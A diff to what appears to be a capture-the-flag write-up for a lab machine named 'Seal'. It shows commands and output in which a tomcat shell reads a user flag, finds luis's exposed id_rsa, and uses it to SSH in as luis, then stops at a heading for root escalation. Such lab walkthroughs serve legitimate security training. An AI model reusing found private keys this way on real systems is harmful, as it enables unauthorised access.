@@ -550,3 +550,86 @@ backup.tar  dashboard  hsperfdata_tomcat  Privesc
 ```
 
 <br />
+
+Now we can `access` to the `luis` directory and read the `flag`:
+
+<br />
+
+```bash
+tomcat@seal:/tmp$ cd dashboard/
+tomcat@seal:/tmp/dashboard$ ls
+bootstrap  css	images	index.html  scripts  uploads
+tomcat@seal:/tmp/dashboard$ cd uploads/
+tomcat@seal:/tmp/dashboard/uploads$ ls
+luis
+tomcat@seal:/tmp/dashboard/uploads$ cd luis/
+tomcat@seal:/tmp/dashboard/uploads/luis$ ls
+gitbucket.war  user.txt
+tomcat@seal:/tmp/dashboard/uploads/luis$ cat user.txt
+af3f361aa0efb30086c3df2c08xxxxxx
+```
+
+<br />
+
+Looking into the user's `directory` we find a his `id_rsa`:
+
+<br />
+
+```bash
+tomcat@seal:/tmp/dashboard/uploads/luis/.ssh$ ls
+authorized_keys  id_rsa  id_rsa.pub
+```
+
+<br />
+
+So we proceed to `connect` as `luis` to `localhost`:
+
+<br />
+
+```bash
+tomcat@seal:/tmp/dashboard/uploads/luis/.ssh$ ssh -i id_rsa luis@localhost
+Could not create directory '/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:YTRJC++A+0ww97kJGc5DWAsnI9iusyCE4Nt9fomhxdA.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Failed to add the host to the list of known hosts (/.ssh/known_hosts).
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun 09 Feb 2025 04:16:36 PM UTC
+
+  System load:           0.0
+  Usage of /:            49.5% of 9.58GB
+  Memory usage:          17%
+  Swap usage:            0%
+  Processes:             172
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.10.250
+  IPv6 address for eth0: dead:beef::250:56ff:fe94:b58c
+
+
+22 updates can be applied immediately.
+15 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sun Feb  9 16:09:50 2025 from 127.0.0.1
+luis@seal:~$ whoami
+luis
+```
+
+<br />
+
+# Privilege Escalation: luis -> root 
+
+<br />
+
+
